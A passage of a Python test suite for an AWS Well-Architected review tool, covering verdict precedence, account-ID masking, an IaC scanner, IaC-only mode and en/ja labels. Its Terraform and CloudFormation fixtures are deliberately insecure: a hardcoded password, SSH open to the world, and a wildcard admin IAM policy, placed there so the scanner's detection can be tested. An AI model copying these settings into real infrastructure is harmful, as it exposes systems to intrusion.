            asks = {r[0].value: r[3].value for r in load_workbook(x)["Questions"].iter_rows(min_row=2)}
            self.assertIn(marker, asks["C-REL-RTO-RPO"], lang)
            self.assertNotIn(marker, asks["C-OPS-OWNERSHIP"], lang)


def repo(cid, verdict, **kw):
    return dict(aws(cid, verdict, **kw), channel="repo")


class ReviewFixes(Seeded):
    """Regression tests for the external review's findings (live environment first, management-only updates, masking, card re-presentation, estimated HRI)."""

    def test_iac_never_overwrites_a_real_environment_verdict(self):
        self.apply(aws(ENC, "✗"))
        code, _, err = self.apply(repo(ENC, "○"))
        self.assertEqual(code, 0)
        it = self.item(ENC)
        self.assertEqual((it["verdict"], it["channel"]), ("✗", "aws"))
        self.assertIn("live-environment", err)   # the reason for skipping tells the user to record it as suspected drift
        self.apply(repo(IDM, "○"))
        self.apply(aws(IDM, "✗"))   # in the reverse order, the live environment overwrites IaC
        self.assertEqual((self.item(IDM)["verdict"], self.item(IDM)["channel"]), ("✗", "aws"))

    def test_management_fields_can_be_updated_without_touching_the_verdict(self):
        self.apply(aws(ENC, "✗", recommendation="r"))
        before = self.item(ENC)
        for force in (False, True):
            code, out, _ = self.apply({"choice_id": ENC, "due": "2026-12-31", "action_status": "doing", "owner": "infra"}, force=force)
            self.assertEqual(code, 0, out)
            it = self.item(ENC)
            self.assertEqual((it["verdict"], it["channel"], it["confidence"]), ("✗", "aws", "H"), force)
            self.assertEqual((it["due"], it["action_status"], it["owner"]), ("2026-12-31", "doing", "infra"), force)
            self.assertEqual(it["evidence_at"], before["evidence_at"], force)   # the evidence time does not advance (old evidence would look new)
            self.assertEqual((it["evidence"], it["recommendation"], it["status"]), (before["evidence"], "r", before["status"]), force)
        # Input with neither a verdict nor a management field stops without silently deleting anything
        code, _, err = self.apply({"choice_id": ENC})
        self.assertNotEqual(code, 0)
        self.assertEqual(self.item(ENC)["verdict"], "✗")
        # Even with management fields only, the value checks are unchanged
        code, _, _ = self.apply({"choice_id": ENC, "due": "next month"})
        self.assertNotEqual(code, 0)

    @needs_openpyxl
    def test_mask_account_ids_covers_every_xlsx_sheet(self):
        import re
        from openpyxl import load_workbook
        acct = "123456789012"
        run(["context", "set", f"aws.account_ids=[\"{acct}\"]", f"service.name=svc-{acct}"], self.d)
        run(["cards", "answer", "C-OPS-OWNERSHIP", "--current", "partial", "--note", f"owner is account {acct}"], self.d)
        self.apply(aws(ENC, "✗", evidence=f"acct {acct}", org_shape=f"shape {acct}", recommendation=f"fix {acct}", notes=f"n {acct}"))
        run(["finalize", "--allow-empty"], self.d)
        x = os.path.join(self.tmp.name, "m.xlsx")
        self.assertEqual(run(["export", "--mask-account-ids", "--out", x], self.d)[0], 0)
        wb = load_workbook(x)
        leaks = [(ws.title, c.coordinate) for ws in wb for row in ws.iter_rows() for c in row
                 if isinstance(c.value, str) and re.search(r"(?<!\d)\d{12}(?!\d)", c.value)]
        self.assertEqual(leaks, [])
        # without the option, nothing is masked
        u = os.path.join(self.tmp.name, "u.xlsx")
        run(["export", "--out", u], self.d)
        self.assertTrue(any(isinstance(c.value, str) and acct in c.value for row in load_workbook(u)["ActionPlan"].iter_rows() for c in row))

    def test_card_is_asked_again_when_a_lens_update_adds_an_item(self):
        run(["plan", "--skip", "repo,aws"], self.d)
        run(["cards", "answer", "C-OPS-OWNERSHIP", "--current", "full"], self.d)
        self.assertNotIn("C-OPS-OWNERSHIP", run(["cards", "next", "-n", "20"], self.d)[1])
        w = self.work()
        added = kensa.new_item({"choice_id": "ops_ops_model_new_in_2027", "question_id": "ops-model", "pillar": "Operational Excellence"})
        added["route"] = dict(self.item(OWN)["route"])
        added["status"] = "new_in_lens"
        w["items"].append(added)
        self.save_work(w)
        self.assertIn("C-OPS-OWNERSHIP", run(["cards", "next", "-n", "20"], self.d)[1])
        self.assertRegex(run(["cards", "list", "--pending"], self.d)[1], r"C-OPS-OWNERSHIP\s+pending")
        # once the new item is answered too, it stops appearing again
        run(["cards", "answer", "C-OPS-OWNERSHIP", "--current", "full"], self.d)
        self.assertNotIn("C-OPS-OWNERSHIP", run(["cards", "next", "-n", "20"], self.d)[1])

    def test_card_answered_before_choice_ids_were_recorded_keeps_the_old_behaviour(self):
        run(["plan", "--skip", "repo,aws"], self.d)
        run(["cards", "answer", "C-OPS-OWNERSHIP", "--current", "full"], self.d)
        p = os.path.join(self.d, "card_answers.json")
        state = read_json(p)
        state["C-OPS-OWNERSHIP"].pop("choice_ids", None)
        write_json(state, p)
        self.assertNotIn("C-OPS-OWNERSHIP", run(["cards", "next", "-n", "20"], self.d)[1])

    def test_estimated_hri_counts_only_confirmed_questions(self):
        qs = {i["question_id"] for i in kensa.active(self.work())}
        run(["finalize", "--allow-empty"], self.d)   # nothing was confirmed, so every item is an assumed ✗
        est = kensa.estimate_risk(kensa.active(self.work()))
        self.assertEqual(sum(c["HIGH"] for c in est.values()), 0)
        self.assertEqual(sum(c["UNRESOLVED"] for c in est.values()), len(qs))
        # only a question whose items were all confirmed ✗ in the live environment becomes HIGH
        w = self.work()
        self.apply(*[aws(i["choice_id"], "✗") for i in w["items"] if i["question_id"] == "protect-data-rest"])
        est = kensa.estimate_risk(kensa.active(self.work()))
        self.assertEqual(est["Security"]["HIGH"], 1)
        self.assertEqual(sum(c["HIGH"] for c in est.values()), 1)
        self.assertEqual(sum(c["UNRESOLVED"] for c in est.values()), len(qs) - 1)


def write_tree(root, files):
    for rel, txt in files.items():
        p = os.path.join(root, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(txt)


TF_MAIN = '''# resource "aws_s3_bucket" "commented_out" { }
resource "aws_s3_bucket" "logs" {
  bucket = "x"
  description = "a } in a string"
  versioning { enabled = true }
}
resource "aws_s3_bucket" "data" { bucket = "y" }
resource "aws_s3_bucket_public_access_block" "data" { bucket = aws_s3_bucket.data.id }
resource "aws_s3_bucket_server_side_encryption_configuration" "data" {
  bucket = aws_s3_bucket.data.id
  rule { apply_server_side_encryption_by_default { sse_algorithm = "aws:kms" } }
}
resource "aws_db_instance" "main" {
  engine = "postgres"
  storage_encrypted = true
  multi_az = true
  backup_retention_period = 7
  deletion_protection = true
  password = "hunter2-secret"
}
resource "aws_security_group" "web" {
  ingress {
    from_port = 443
    to_port = 443
    cidr_blocks = ["0.0.0.0/0"]
  }
  ingress {
    from_port = 22
    to_port = 22
    cidr_blocks = ["0.0.0.0/0"]
  }
  egress {
    from_port = 0
    to_port = 0
    cidr_blocks = ["0.0.0.0/0"]
  }
}
resource "aws_iam_policy" "admin" {
  policy = <<EOT
{ "Statement": [ { "Effect": "Allow", "Action": "*", "Resource": "*" } ] }
EOT
}
resource "google_compute_instance" "other_provider" { name = "x" }
'''

CFN_YAML = '''AWSTemplateFormatVersion: '2010-09-09'
Resources:
  Bucket:
    Type: AWS::S3::Bucket
    Properties:
      BucketEncryption:
        ServerSideEncryptionConfiguration: []
      PublicAccessBlockConfiguration:
        BlockPublicAcls: true
      LifecycleConfiguration:
        Rules:
          - Id: a
            Status: Enabled
  Db:
    Type: AWS::RDS::DBInstance
    Properties:
      StorageEncrypted: true
      KmsKeyId: !Ref Key
      MultiAZ: !Ref IsProd
  Sg:
    Type: AWS::EC2::SecurityGroup
    Properties:
      SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 443
          ToPort: 443
          CidrIp: 0.0.0.0/0
        - IpProtocol: tcp
          FromPort: 22
          ToPort: 22
          CidrIp: 10.0.0.0/8
      SecurityGroupEgress:
        - IpProtocol: -1
          CidrIp: 0.0.0.0/0
Outputs:
  X:
    Value: 1
'''

CDK_OUT = json.dumps({"Resources": {
    "Fn": {"Type": "AWS::Lambda::Function", "Properties": {"TracingConfig": {"Mode": "Active"}}},
    "Key": {"Type": "AWS::KMS::Key", "Properties": {"EnableKeyRotation": True}}}})


class IacScan(unittest.TestCase):
    def scan(self, files):
        with tempfile.TemporaryDirectory() as t:
            write_tree(t, files)
            return kensa_scan.scan_iac(t)

    def test_terraform_counts_and_flags(self):
        r = self.scan({"infra/main.tf": TF_MAIN})
        res = r["resources"]
        self.assertEqual(r["tools"], ["terraform"])
        self.assertEqual(res["s3_bucket"]["count"], 2)   # a resource on a comment line is not counted
        f = res["s3_bucket"]["flags"]
        # Encryption and public-access-block are declared as separate resources, so they are added to the count. versioning is inside the body
        self.assertEqual((f["public_access_block"], f["encryption"], f["kms_encryption"], f["versioning"]), (1, 1, 1, 1))
        self.assertEqual(res["rds"]["flags"], {"storage_encrypted": 1, "multi_az": 1, "backup_retention": 1, "deletion_protection": 1, "publicly_accessible": 0})
        self.assertEqual(res["iam"]["flags"]["wildcard_action"], 1)   # Action: * inside a heredoc
        self.assertNotIn("other_provider", json.dumps(r))   # providers other than aws_ are not read

    def test_security_group_world_ingress_ignores_egress_and_web_ports(self):
        r = self.scan({"main.tf": TF_MAIN, "t.yaml": CFN_YAML})
        sg = r["resources"]["security_group"]
        self.assertEqual(sg["count"], 2)
        # Terraform opens 443 and 22, so there is a port other than 80/443. CFN opens only 443 (22 is 10.0.0.0/8). 0.0.0.0/0 in egress is ignored
        self.assertEqual(sg["flags"], {"world_ingress": 2, "world_ingress_non_web": 1})

    def test_cloudformation_yaml_does_not_confuse_lifecycle_status_with_versioning(self):
        r = self.scan({"t.yaml": CFN_YAML})
        self.assertEqual(r["tools"], ["cloudformation"])
        b = r["resources"]["s3_bucket"]["flags"]
        self.assertEqual((b["encryption"], b["public_access_block"], b["lifecycle"], b["versioning"]), (1, 1, 1, 0))
        # values passed via !Ref / parameters cannot be read = not counted (erring on the side of 'declaration not confirmed')
        self.assertEqual(r["resources"]["rds"]["flags"]["multi_az"], 0)
        self.assertEqual(r["resources"]["rds"]["flags"]["storage_encrypted"], 1)

    def test_cdk_out_templates_are_read_but_cdk_source_is_not(self):
        r = self.scan({"cdk.json": "{}", "cdk.out/Stack.template.json": CDK_OUT, "cdk.out/asset.abc/x.template.json": CDK_OUT})
        self.assertEqual(r["sources"]["cdk_out_templates"], 1)   # asset.* is not read
        self.assertEqual(r["tools"], ["cdk(synth)"])
        self.assertEqual(r["resources"]["kms_key"]["flags"]["rotation"], 1)
        self.assertEqual(r["resources"]["lambda_function"]["flags"]["tracing_active"], 1)
        self.assertEqual(r["notes"], [])
        src_only = self.scan({"cdk.json": "{}", "lib/stack.ts": "new s3.Bucket(this, 'B')"})
        self.assertEqual(src_only["resources"], {})
        self.assertTrue(any("cdk synth" in n for n in src_only["notes"]))

    def test_skips_vendor_dirs_and_unrelated_json(self):
        r = self.scan({"node_modules/m/x.tf": 'resource "aws_kms_key" "k" {}', ".terraform/m/y.tf": 'resource "aws_kms_key" "k" {}',
                       "package.json": '{"name": "x", "Resources": "AWS::"}', "README.md": "AWS::S3::Bucket"})
        self.assertEqual(r["resources"], {})
        self.assertTrue(any("no readable resource definitions" in n for n in r["notes"]))

    def test_output_has_no_values(self):
        r = self.scan({"main.tf": TF_MAIN + f'\nresource "aws_iam_user" "u" {{ note = "{FAKE_KEY}" }}\n'})
        dump = json.dumps(r, ensure_ascii=False)
        self.assertNotIn("hunter2", dump)
        self.assertNotIn(FAKE_KEY, dump)
        self.assertNotIn("password", dump)


def iac_entry(cid, verdict="○", **kw):
    e = {"choice_id": cid, "verdict": verdict, "channel": "repo", "confidence": "H", "evidence": "IaC: rds StorageEncrypted=true"}
    e.update(kw)
    return e


class IacMode(unittest.TestCase):
    AWS_ONLY = "sec_protect_data_rest_encrypt"                          # route: aws
    REPO_FIRST = "sec_appsec_manual_code_reviews"   # route: repo, interview (no aws)
    DRAFT_WITH_AWS = "ops_ops_model_def_activity_owners"   # route: repo, aws, interview (draft)
    DR_TESTED = "rel_planning_for_recovery_dr_tested"   # route: aws, interview (card C-REL-RTO-RPO)

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.d = os.path.join(self.tmp.name, ".kensa")
        run(["init"], self.d)
        run(["seed", "--from-csv", FIXTURE], self.d)

    def tearDown(self):
        self.tmp.cleanup()

    def work(self):
        return read_json(os.path.join(self.d, "worklist.json"))

    def item(self, cid):
        return next(i for i in self.work()["items"] if i["choice_id"] == cid)

    def apply(self, *entries, force=False):
        f = os.path.join(self.tmp.name, "a.json")
        write_json(list(entries), f)
        return run(["apply", f] + (["--force"] if force else []), self.d)

    def pending(self, card):
        st = kensa.Store(self.d)
        return dict((c["id"], ids) for c, ids in kensa.pending_cards(st.work(), kensa.load_cards(st))).get(card, [])

    def test_default_is_both_and_switch_survives_a_reseed(self):
        self.assertIn("both", run(["mode"], self.d)[1])
        code, out, _ = run(["mode", "iac"], self.d)
        self.assertEqual(code, 0)
        self.assertEqual(self.work()["meta"]["mode"], "iac")
        run(["seed", "--from-csv", FIXTURE], self.d)   # re-seed for a lens update
        self.assertEqual(self.work()["meta"]["mode"], "iac")
        self.assertNotEqual(run(["mode", "bogus"], self.d)[0], 0)

    def test_scan_aws_is_refused_in_iac_mode_and_records_nothing(self):
        run(["mode", "iac"], self.d)
        code, _, err = run(["scan-aws", "--regions", "ap-northeast-1"], self.d)
        self.assertNotEqual(code, 0)
        self.assertIn("mode=iac", err)
        self.assertNotIn("aws", self.work()["meta"].get("scans", {}))
        self.assertFalse(os.path.exists(os.path.join(self.d, "evidence", "aws-scan.json")))

    def test_cards_wait_for_the_iac_scan_instead_of_the_aws_scan(self):
        run(["mode", "iac"], self.d)
        obj = "rel_planning_for_recovery_objective_defined_recovery"      # aws + repo + interview
        run(["plan", "--skip", "repo"], self.d)
        self.assertNotIn(obj, self.pending("C-REL-RTO-RPO"))   # scan-iac has not run yet
        run(["plan", "--skip", "iac"], self.d)
        self.assertIn(obj, self.pending("C-REL-RTO-RPO"))   # aws is not read (not waited for)
        self.assertNotIn("aws", self.work()["meta"].get("scans", {}))

    def test_aws_channel_is_not_recorded_in_iac_mode(self):
        run(["mode", "iac"], self.d)
        code, out, err = self.apply(iac_entry(self.AWS_ONLY, channel="aws"))
        self.assertEqual(code, 0)
        self.assertIn("applied 0, skipped 1", out)
        self.assertIn("channel=aws", err)
        self.assertIsNone(self.item(self.AWS_ONLY)["verdict"])

    def test_iac_only_judgment_is_capped_at_medium_and_marked(self):
        run(["mode", "iac"], self.d)
        code, out, _ = self.apply(iac_entry(self.AWS_ONLY))
        it = self.item(self.AWS_ONLY)
        self.assertEqual((it["verdict"], it["channel"], it["confidence"], it["basis"]), ("○", "repo", "M", "iac_only"))
        self.assertIn("H → M", out)
        # an item without an aws route (a repository fact) and a draft item get neither the cap nor the mark
        self.apply(iac_entry(self.REPO_FIRST), iac_entry(self.DRAFT_WITH_AWS, confidence="M"))
        self.assertEqual((self.item(self.REPO_FIRST)["confidence"], self.item(self.REPO_FIRST).get("basis")), ("H", None))
        self.assertIsNone(self.item(self.DRAFT_WITH_AWS).get("basis"))

    def test_both_mode_keeps_the_old_behaviour(self):
        self.apply(iac_entry(self.AWS_ONLY))
        it = self.item(self.AWS_ONLY)
        self.assertEqual((it["confidence"], it.get("basis")), ("H", None))

    def test_real_environment_evidence_replaces_an_iac_only_judgment(self):
        run(["mode", "iac"], self.d)
        self.apply(iac_entry(self.AWS_ONLY, verdict="△"))
        code, out, _ = run(["mode", "both"], self.d)
        self.assertIn("1 item(s) judged from IaC only", out)                                          # tells how many were judged from IaC only
        self.assertEqual(self.item(self.AWS_ONLY)["basis"], "iac_only")   # the mark stays until the live environment is read
        self.apply(iac_entry(self.AWS_ONLY, verdict="✗", channel="aws"))
        it = self.item(self.AWS_ONLY)
        self.assertEqual((it["verdict"], it["channel"], it["confidence"]), ("✗", "aws", "H"))
        self.assertNotIn("basis", it)

    def test_a_human_answer_that_replaces_it_clears_the_mark(self):
        run(["mode", "iac"], self.d)
        self.apply(iac_entry(self.DR_TESTED, verdict="○"))
        self.assertEqual(self.item(self.DR_TESTED)["basis"], "iac_only")
        run(["plan", "--skip", "repo,iac"], self.d)
        run(["cards", "answer", "C-REL-RTO-RPO", "--current", "none", "--force"], self.d)
        it = self.item(self.DR_TESTED)
        self.assertEqual((it["channel"], it["verdict"]), ("interview", "✗"))
        self.assertNotIn("basis", it)

    def test_outputs_say_the_judgment_is_not_confirmed_in_the_real_environment(self):
        run(["mode", "iac"], self.d)
        self.apply(iac_entry(self.AWS_ONLY), iac_entry(self.REPO_FIRST))
        run(["finalize", "--allow-empty"], self.d)
        j = os.path.join(self.tmp.name, "o.json")
        run(["export", "--format", "json", "--out", j], self.d)
        doc = read_json(j)
        self.assertEqual(doc["meta"]["mode"], "iac")
        basis = {i["choice_id"]: i["basis"] for i in doc["items"]}
        self.assertEqual((basis[self.AWS_ONLY], basis[self.REPO_FIRST]), ("iac_only", None))
        for lang in ("en", "ja"):
            t = i18n.labels(lang)
            c = os.path.join(self.tmp.name, f"o-{lang}.csv")
            run(["export", "--format", "csv", "--out", c], self.d, lang=lang)
            with open(c, encoding="utf-8-sig", newline="") as fh:
                rows = {r["ChoiceId"]: r for r in csv.DictReader(fh)}
            source = t["cols"][8]
            self.assertEqual(rows[self.AWS_ONLY][source], t["iac_only"])
            self.assertEqual(rows[self.REPO_FIRST][source], t["ch"]["repo"])
        st = run(["status"], self.d)[1]
        self.assertIn("judged from IaC only", st)
        self.assertIn("mode: iac", st)
        push = run(["push", "--workload-id", "a" * 32, "--allow-unresolved"], self.d)[1]
        self.assertIn("judged from IaC only", push)

    def test_openitems_and_summary_in_the_workbook(self):
        try:
            from openpyxl import load_workbook
        except ImportError:
            self.skipTest("openpyxl is not installed")
        run(["mode", "iac"], self.d)
        self.apply(iac_entry(self.AWS_ONLY))
        run(["finalize", "--allow-empty"], self.d)
        for lang in ("en", "ja"):
            t = i18n.labels(lang)
            x = os.path.join(self.tmp.name, f"o-{lang}.xlsx")
            self.assertEqual(run(["export", "--out", x], self.d, lang=lang)[0], 0)
            wb = load_workbook(x)
            reasons = {r[1].value: r[6].value for r in wb["OpenItems"].iter_rows(min_row=2)}
            self.assertEqual(reasons[self.AWS_ONLY], t["oi_iac_only"])
            notes = " ".join(str(c.value) for r in wb["Summary"].iter_rows() for c in r if c.value)
            self.assertIn(t["iac_only"], notes)
            ctx = {r[0].value: r[1].value for r in wb["Context"].iter_rows(min_row=2)}
            self.assertTrue(str(ctx["review.mode"]).startswith("iac"))
            self.assertIn(t["mode"]["iac"], ctx["review.mode"])

    def test_plan_points_to_scan_iac_not_scan_aws(self):
        run(["mode", "iac"], self.d)
        out = run(["plan"], self.d)[1]
        self.assertIn("scan-iac", out)
        self.assertNotIn("scan-aws", out)
        self.assertEqual(json.loads(run(["plan", "--json"], self.d)[1])["mode"], "iac")
        run(["mode", "both"], self.d)
        self.assertIn("scan-aws", run(["plan"], self.d)[1])

    def test_scan_iac_command_records_the_scan_in_either_mode(self):
        src = os.path.join(self.tmp.name, "repo")
        write_tree(src, {"main.tf": TF_MAIN})
        for mode in ("both", "iac"):
            run(["mode", mode], self.d)
            code, out, _ = run(["scan-iac", "--path", src], self.d)
            self.assertEqual(code, 0, out)
            self.assertIn("iac", self.work()["meta"]["scans"])
            ev = read_json(os.path.join(self.d, "evidence", "iac-scan.json"))
            self.assertEqual(ev["repos"][0]["resources"]["rds"]["count"], 1)
        self.assertIn("not found", out)                                   # in mode=iac, 'not in IaC does not mean not in AWS' is attached


# ------------------------------------------------------------------ locales (en / ja)
CJK = re.compile(r"[\u3040-\u30ff\u4e00-\u9fff\uff00-\uffef\u3000-\u303f]")


def walk_strings(o):
    if isinstance(o, str):
        yield o
    elif isinstance(o, dict):
        for k, v in o.items():
            yield from walk_strings(k)
            yield from walk_strings(v)
    elif isinstance(o, (list, tuple)):
        for v in o:
            yield from walk_strings(v)


# The Japanese strings earlier versions wrote, frozen here: the `ja` table must keep producing exactly these.
OLD_JA = {
    "undetermined": "未判定",
    "cols": ["Pillar", "QuestionId", "QuestionTitle", "ChoiceId", "BestPractice", "Description", "AWSCheckable", "判定", "確認元", "確信度",
             "根拠・証跡", "組織の形、ツール", "推奨アクション", "工数", "優先度", "担当", "CardId", "確認経路", "備考", "確認日"],
    "ch": {"aws": "AWS(実環境)", "repo": "リポジトリ/IaC", "interview": "面談(自己申告)", "assumed": "仮置き(要確認)", "imported": "取込み(要再確認)"},
    "conf": {"H": "高", "M": "中", "L": "低"},
    "route": {"aws": "AWS", "repo": "リポジトリ", "interview": "面談"},
    "tier": {"decide": "【確定】", "draft": "【下書き】", "ask": "【面談】"},
    "iac_only": "IaC(実環境未確認)",
    "mode": {"both": "実環境(AWS)と IaC の両方(既定)", "iac": "IaC のみ(AWS の実環境は読まない)"},
    "added_in_lens": "[レンズ更新で追加] ",
    "sum_title": "Well-Architected レビュー サマリー",
    "sum_hdr": ["Pillar", "○ 実施", "△ 部分", "✗ 未実施", "N/A", "未判定", "合計", "うち仮置き(要確認)", "FTR対象", "質問数", "推定HRI(確定分・参考)",
                "判定未確定の質問数", "記録済み率(未判定を除く)", "確認済み率(仮置きも除く)"],
    "ftr_required": "必須(HRI=0)",
    "sum_total": "合計",
    "tier_hdr": ["確認経路(設計上の分類・全項目)", "件数", "意味"],
    "tier_meaning": {"decide": "AWS/リポジトリの証拠で判定できる", "draft": "証拠は下書き。人が確認して確定", "ask": "人にしか答えられない(面談)"},
    "notes_hdr": "注記",
    "q_hdr": ["CardId", "状態", "テーマ", "質問", "○ の状態", "△ の状態", "✗ の状態", "★推奨(手順)", "代替案", "採用時の組織の形、ツール", "対象項目数", "現状の回答",
              "採用した選択肢", "メモ"],
    "q_answered": "回答済み",
    "q_unanswered": "未回答",
    "q_effort": "  (工数{effort}/{priority})",
    "q_current": {"full": "○ 実施", "partial": "△ 部分", "none": "✗ 未実施", "na": "N/A"},
    "ask_technical": "\n(専門用語: {ask})",
    "oi_hdr": ["Pillar", "ChoiceId", "BestPractice", "判定", "確認元", "確信度", "確認すべきこと", "CardId"],
    "oi_undetermined_card": "未判定: 質問カード {card} で現状を確認",
    "oi_undetermined_scan": "未判定: AWS/リポジトリのスキャン結果から判定(スキャン不可なら個別に質問)",
    "oi_assumed": "証跡も回答も得られず仮置き。AWS/リポジトリ/担当者で現状を確認して更新",
    "oi_imported": "別環境の判定を取り込んだ値。実環境で再確認",
    "oi_draft": "証跡からの下書き。『ある』ことは確認できたが、運用の実態・品質は未確認。担当者が確認して確定",
    "oi_iac_only": "IaC だけで判定(宣言を読んだだけで、AWS の実環境は未確認)。実環境を読める時に `mode both` → `scan-aws` で確認。手作業の変更・別スタックとの差(ドリフト)に注意",
    "oi_self_reported": "自己申告の○。証跡(URL/設定/ドキュメント)を添付して確信度を上げる",
    "oi_low_conf": "確信度が低い。追加の証跡で確認",
    "oi_stale": "証拠の記録から {days} 日経過(目安 {limit} 日)。再スキャン・再確認して更新",
    "ap_hdr": ["優先度", "Pillar", "QuestionId", "ChoiceId", "BestPractice", "判定", "推奨アクション", "組織の形、ツール", "工数", "担当", "確認元", "期限", "実施状態"],
    "ap_undetermined": "未判定(提案)",
    "status": {"todo": "未着手", "doing": "対応中", "done": "完了"},
    "ctx_hdr": ["項目", "値"],
    "fill": {"po": "PO", "infra_owner": "インフラ担当", "chat": "チャット", "vcs": "Git", "ci": "CI", "ticket": "チケット管理", "docs": "ドキュメント", "service": "本サービス"},
}
OLD_JA_SYSTEM = {
    "ev.imported": "取り込み元シートの判定(別環境の可能性。要再確認)",
    "ev.assumed": "証跡も回答も得られなかったため未実施と仮置き(要確認)",
    "rec.assumed": "要確認: 現状を確認し、判定を更新してください",
    "na.default": "該当なし",
    "ctx.infra_owner": "インフラ担当",
    "ctx.docs": "GitHub(docs/ と README)",
}
OLD_JA_PREFIX = {"org.proposal": "【提案】", "org.alt": "(代替案採用) ", "ev.self": "自己申告("}


def placeholders(s):
    return sorted(f for _, f, _, _ in string.Formatter().parse(s) if f)


class LabelTables(unittest.TestCase):
    def test_ja_table_equals_the_japanese_strings_of_earlier_versions(self):
        ja = i18n.LABELS["ja"]
        for key, expected in OLD_JA.items():
            self.assertEqual(ja[key], expected, key)
        for key, expected in OLD_JA_SYSTEM.items():
            self.assertEqual(i18n.SYSTEM_TEXT[key]["ja"], expected, key)
        for key, expected in OLD_JA_PREFIX.items():
            self.assertEqual(i18n.SYSTEM_PREFIX[key]["ja"], expected, key)
        # the notes that mention the assumed label are templates; filled in, they are the old sentences
        assumed = ja["ch"]["assumed"]
        self.assertEqual(ja["note_assumed"].format(assumed=assumed), "・『仮置き(要確認)』は証跡も回答も得られず ✗ と仮置きした項目です。OpenItems シートで確認してください。")
        self.assertEqual(ja["note_rates"].format(assumed=assumed),
                         "・記録済み率は判定が付いた割合、確認済み率はそこから仮置き(要確認)も除いた割合です。仮置きは『未実施と確認できた』ことを意味しません。")
        self.assertTrue(ja["note_hri"].format(assumed=assumed).startswith("・推定HRIは『判定が確定した質問のうち、○が1つも無い質問』の数による参考値です。未判定の項目や仮置き(要確認)の項目を含む質問は"))
        self.assertEqual(ja["note_iac"].format(n=3, label=ja["iac_only"]),
                         "・確認元が『IaC(実環境未確認)』の 3 件は、IaC の宣言を読んだだけで AWS の実環境は確認していません(手作業の変更や別スタックとの差は見えません)。"
                         "OpenItems に出ています。FTR や外部への提出の前に、実環境で確認してください。")
        self.assertEqual(ja["sum_info"].format(service="S", lens="L v", at="T"), "サービス: S  /  レンズ: L v  /  出力: T")

    def test_en_table_is_english_and_has_the_shape_of_the_ja_table(self):
        en, ja = i18n.LABELS["en"], i18n.LABELS["ja"]
        self.assertEqual(set(en), set(ja))
        for key in en:
            self.assertEqual(type(en[key]), type(ja[key]), key)
            if isinstance(en[key], list):
                self.assertEqual(len(en[key]), len(ja[key]), key)
            if isinstance(en[key], dict):
                self.assertEqual(set(en[key]), set(ja[key]), key)
            for e, j in zip(walk_strings(en[key]), walk_strings(ja[key])):
                self.assertEqual(placeholders(e), placeholders(j), (key, e, j))
        self.assertEqual([s for s in walk_strings(en) if CJK.search(s)], [])
        for code, per in i18n.SYSTEM_TEXT.items():
            self.assertFalse(CJK.search(per["en"]), code)
        for code, per in i18n.SYSTEM_PREFIX.items():
            self.assertFalse(CJK.search(per["en"]), code)
        # canonical English terms
        self.assertEqual(en["ch"], {"aws": "AWS (live environment)", "repo": "Repository / IaC", "interview": "Interview (self-reported)",
                                    "assumed": "assumed (needs confirmation)", "imported": "imported (needs re-check)"})
        self.assertEqual(en["tier"], {"decide": "[Decided]", "draft": "[Draft]", "ask": "[Interview]"})
        self.assertEqual(en["iac_only"], "IaC (live environment not verified)")
        self.assertEqual(en["status"], {"todo": "Not started", "doing": "In progress", "done": "Done"})
        self.assertEqual(en["undetermined"], "Undetermined")
        self.assertEqual((en["cols"][7], en["cols"][11], en["cols"][8], en["cols"][17], en["cols"][18], en["cols"][19]),
                         ("Verdict", "Org shape / tools", "Source", "Route", "Notes", "Confirmed on"))
        self.assertIn("of which assumed (needs confirmation)", en["sum_hdr"][7].lower())

    def test_stored_system_texts_are_english_and_old_japanese_forms_are_recognised(self):
        for code, per in i18n.SYSTEM_TEXT.items():
            for lang in ("en", "ja"):
                self.assertEqual(i18n.localize_stored(per["en"], lang), per[lang], code)
                self.assertEqual(i18n.localize_stored(per["ja"], lang), per[lang], code)      # what older versions stored
        for code, per in i18n.SYSTEM_PREFIX.items():
            for lang in ("en", "ja"):
                for src in ("en", "ja"):
                    self.assertEqual(i18n.localize_stored(per[src] + "tail", lang), per[lang] + "tail", (code, src, lang))
        self.assertEqual(i18n.localize_stored("user text 実施", "en"), "user text 実施")      # anything else is left alone
        self.assertEqual(i18n.localize_stored("", "ja"), "")
        self.assertIsNone(i18n.localize_stored(None, "ja"))


class LanguageResolution(Seeded):
    def test_resolve_lang_order_and_defaults(self):
        r = i18n.resolve_lang
        self.assertEqual(r(), "en")
        self.assertEqual(r(None, None, "ja"), "ja")                   # context.json
        self.assertEqual(r(None, "en", "ja"), "en")                   # env beats context.json
        self.assertEqual(r("ja", "en", "en"), "ja")                   # --lang beats env
        self.assertEqual(r("en", "ja", "ja"), "en")
        self.assertEqual(r(None, "", "ja"), "ja")                     # an empty value is "not set"
        self.assertEqual(r(None, "JA", None), "ja")
        self.assertEqual(r(None, "ja_JP.UTF-8", None), "ja")
        self.assertEqual(r("en-US"), "en")
        warned = []
        self.assertEqual(r(None, "fr", "ja", warn=warned.append), "ja")      # an unsupported value is skipped, with a warning
        self.assertEqual(len(warned), 1)
        self.assertIn("KENSA_LANG", warned[0])
        self.assertIn("en, ja", warned[0])
        self.assertEqual(r("xx", None, None), "en")

    def export_header(self, **kw):
        c = os.path.join(self.tmp.name, "h.csv")
        code, _, err = run(["export", "--format", "csv", "--out", c], self.d, **kw)
        self.assertEqual(code, 0, err)
        return list(csv.reader(io.StringIO(read_text(c, "utf-8-sig"))))[0]

    def test_cli_order_flag_then_env_then_context_then_english(self):
        en, ja = i18n.LABELS["en"]["cols"], i18n.LABELS["ja"]["cols"]
        self.assertEqual(self.export_header(), en)                                               # nothing set: English
        self.assertEqual(read_json(os.path.join(self.d, "context.json"))["language"], "en")     # the template records it
        self.assertEqual(run(["context", "set", "language=ja"], self.d)[0], 0)
        self.assertEqual(self.export_header(), ja)                                               # context.json
        self.assertEqual(self.export_header(env={"KENSA_LANG": "en"}), en)                       # env beats context.json
        self.assertEqual(self.export_header(env={"KENSA_LANG": "en"}, lang="ja"), ja)            # --lang beats env
        self.assertEqual(self.export_header(lang="en"), en)                                      # --lang beats context.json
        run(["context", "set", "language=en"], self.d)
        self.assertEqual(self.export_header(env={"KENSA_LANG": "ja"}), ja)
        self.assertEqual(self.export_header(), en)

    def test_an_unsupported_env_or_context_value_warns_and_falls_back(self):
        c = os.path.join(self.tmp.name, "h.csv")
        code, _, err = run(["export", "--format", "csv", "--out", c], self.d, env={"KENSA_LANG": "fr"})
